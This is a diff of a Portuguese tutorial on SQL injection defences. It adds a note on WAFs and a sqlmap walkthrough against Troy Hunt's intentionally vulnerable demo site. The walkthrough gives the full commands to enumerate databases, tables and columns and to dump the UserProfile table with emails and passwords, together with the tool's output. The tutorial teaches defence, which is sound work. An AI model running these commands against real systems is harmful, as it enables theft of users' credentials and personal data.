@@ -86,7 +86,9 @@ Nessa ocasião, mesmo que o input tivesse caracteres estranhos como o `'`, a bus
 
 ### Validar dados de entrada manualmente (whitelist)
 
-Essa técnica basicamente visa eliminar os vetores de ataque recusando queries com caracteres suspeitos. Exemplos desse tipo de queries são strings de entrada contendo `1=1`, `<script>` ou mesmo `'`, salvo nos casos onde esses caracteres são legítimos, como apóstrofos em nomes. **Validar a entrada é um método recomendado mesmo quando outros métodos de proteção são utilizados**.
+Essa técnica basicamente visa eliminar os vetores de ataque recusando queries com caracteres suspeitos. Exemplos desse tipo de queries são strings de entrada contendo `1=1`, `<script>` ou mesmo `'`, salvo nos casos onde esses caracteres são legítimos, como apóstrofos em nomes. **Validar a entrada é um método recomendado mesmo quando outros métodos de proteção são utilizados**. 
+
+Outra forma de validar dados de entrada de forma automatizada é utilizar **Web Application Firewalls**, ou **WAFs**. O problema com eles, embora sirvam para bloquear grande parte das query maliciosas, é que eles também podem ser enganados, levando a falsos positivos ou, pior, à falsos negativos. Além disso, eles impactam a performance da aplicação pois precisam processar todos os pacotes recebidos.
 
 ### Escapar dados de entrada
 
@@ -108,7 +110,7 @@ Consiste em converter dados de entrada em caracteres que não causam problemas. 
 
 ## Testando suas aplicações
 
-Por muitas vezes é difícil testar suas aplicações para todos os vetores de ataque e todos os formulários existentes. Por isso, existem ferramentas automatizadas para teste das aplicações que fazem milhares de testes por segundo. Vamos utilizar o [**sqlmap**](http://sqlmap.org/) (`apt install sqlmap`). O site alvo será o [Hackyourselffirst](https://hackyourselffirst.troyhunt.com), um site dedicado a mostrar esse tipo de vulnerabilidade.
+Por muitas vezes é difícil testar suas aplicações para todos os vetores de ataque e todos os formulários existentes. Por isso, existem ferramentas automatizadas para teste das aplicações que fazem milhares de testes por segundo. Vamos utilizar o [**sqlmap**](http://sqlmap.org/). O site alvo será o [Hackyourselffirst](https://hackyourselffirst.troyhunt.com), um site dedicado a mostrar esse tipo de vulnerabilidade.
 
 Uma análise inicial mostra que a página utiliza requisições do tip GET, que provavelmente são dados como instruções ao banco de dados, como na variável `orderby`.
 
@@ -116,7 +118,7 @@ Uma análise inicial mostra que a página utiliza requisições do tip GET, que 
 https://hackyourselffirst.troyhunt.com/Make/1?orderby=1
 ```
 
-Vamos tentar passar um caractere proibido e ver como site responde.
+Vamos tentar passar um caractere proibido como o `'` e ver como site responde.
 
 ```
 https://hackyourselffirst.troyhunt.com/Make/1?orderby='
@@ -124,6 +126,116 @@ https://hackyourselffirst.troyhunt.com/Make/1?orderby='
 
 <img src="https://cloud.githubusercontent.com/assets/8211602/26791649/20b548ca-49ee-11e7-8642-8a3d16e50f91.png" style="width: 100%;"/>
 
-Um bom sinal! Os erros não são tratados, o que significa que a aplicação pode ser vulnerável. Vamos rodar o **sqlmap** e tentar explorar essa variável.
+Um bom sinal! Os erros não são tratados e pior, são mostrados imediatamente ao usuário, o que significa que a aplicação pode ser vulnerável. Vamos rodar o [**sqlmap**](https://github.com/sqlmapproject/sqlmap) e tentar explorar essa variável. Primeiro, vamos enumerar os bancos da vítima:
+
+```bash
+./sqlmap.py --url "http://hackyourselffirst.troyhunt.com/Make/1?orderby=supercarid" --dbs
+```
+
+E então ele começa a trabalhar, rodando um teste automatizado que enumera os bancos.
+
+<img src="https://user-images.githubusercontent.com/8211602/33934197-47c0c688-dfdf-11e7-809d-8c1f2d5b7164.png" style="width: 100%;"/>
+
+E, como em um passe de mágica, ele nos retorna a estrutura do bancos de dados!
+
+```
+[08:17:00] [INFO] retrieved: hackyourselffirst_db
+[08:17:01] [INFO] retrieved: master
+[08:17:01] [INFO] retrieved: tempdb
+[08:17:02] [INFO] retrieved:  
+available databases [3]:
+[*] hackyourselffirst_db
+[*] master
+[*] tempdb
+```
+
+Agora que já sabemos qual o banco que vamos atacar, precisamos enumerar as tabelas:
+
+```bash
+./sqlmap.py --url "http://hackyourselffirst.troyhunt.com/Make/1?orderby=supercarid" -D hackyourselffirst_db --tables
+```
+
+E voalá:
+
+```
+[08:30:19] [INFO] fetching tables for database: hackyourselffirst_db
+[08:30:19] [INFO] the SQL query used returns 11 entries
+[08:30:20] [INFO] retrieved: dbo.Make
+[08:30:20] [INFO] retrieved: dbo.Supercar
+[08:30:21] [INFO] retrieved: dbo.UserProfile
+[08:30:21] [INFO] retrieved: dbo.Vote
+[08:30:22] [INFO] retrieved: dbo.webpages_Membership
+[08:30:22] [INFO] retrieved: dbo.webpages_OAuthMembership
+[08:30:23] [INFO] retrieved: dbo.webpages_Roles
+[08:30:23] [INFO] retrieved: dbo.webpages_UsersInRoles
+[08:30:24] [INFO] retrieved: sys.database_firewall_rules
+[08:30:24] [INFO] retrieved: sys.script_deployment_status
+[08:30:25] [INFO] retrieved: sys.script_deployments
+Database: hackyourselffirst_db
+[11 tables]
++------------------------------+
+| Make                         |
+| Supercar                     |
+| UserProfile                  |
+| Vote                         |
+| webpages_Membership          |
+| webpages_OAuthMembership     |
+| webpages_Roles               |
+| webpages_UsersInRoles        |
+| sys.database_firewall_rules  |
+| sys.script_deployment_status |
+| sys.script_deployments       |
++------------------------------+
+```
+
+Vamos selecionar uma tabela com informações sensitivas, que costumam ser as mais vulneráveis para as empresas porque contém informações de clientes. A tabela `UserProfile` parece ser promissora!
+
+```bash
+./sqlmap.py --url "http://hackyourselffirst.troyhunt.com/Make/1?orderby=supercarid" -D hackyourselffirst_db -T UserProfile --columns
+```
+
+E, como esperado, essa tabela contém informações relevantes dos usuários:
+
+```
+[08:33:21] [INFO] retrieved: Email
+[08:33:21] [INFO] retrieved: nvarchar
+[08:33:22] [INFO] retrieved: FirstName
+[08:33:23] [INFO] retrieved: nvarchar
+[08:33:23] [INFO] retrieved: IsAdmin
+[08:33:24] [INFO] retrieved: bit
+[08:33:24] [INFO] retrieved: LastName
+[08:33:25] [INFO] retrieved: nvarchar
+[08:33:26] [INFO] retrieved: Password
+[08:33:26] [INFO] retrieved: nvarchar
+[08:33:27] [INFO] retrieved: UserId
+[08:33:27] [INFO] retrieved: int
+Database: hackyourselffirst_db
+Table: UserProfile
+[6 columns]
++-----------+----------+
+| Column    | Type     |
++-----------+----------+
+| Email     | nvarchar |
+| FirstName | nvarchar |
+| IsAdmin   | bit      |
+| LastName  | nvarchar |
+| Password  | nvarchar |
+| UserId    | int      |
++-----------+----------+
+```
+
+Por fim, vamos fazer um dump de toda a tabela de usuários (porque não?):
+
+```bash
+./sqlmap.py --url "http://hackyourselffirst.troyhunt.com/Make/1?orderby=supercarid" -D hackyourselffirst_db -T UserProfile --dump 
+```
+
+E todo o banco agora é nosso:
+
+<img src="https://user-images.githubusercontent.com/8211602/33935028-ae631146-dfe1-11e7-80d6-ccb9f235e84e.png" style="width: 100%;"/>
+
+Agora imagine o que isso implicaria para um site que lida com informações como números de cartões. **Em cinco minutos, todos os dados de todos os usuários poderiam ser obtidos por alguém copiando e colando comandos na tela do computador.** Por isso é tão importante que as empresas tenham o cuidado de manter seus websites sempre seguros. O principal problema aqui é que, caso o administrados não mantivesse ou não prestasse atenção nos logs do seu serviço, ele provavelmente nem saberia que todos os seus dados foram roubados.
+
+Então lembrem-se. **Sempre validem os dados dos usuários!**
 
 
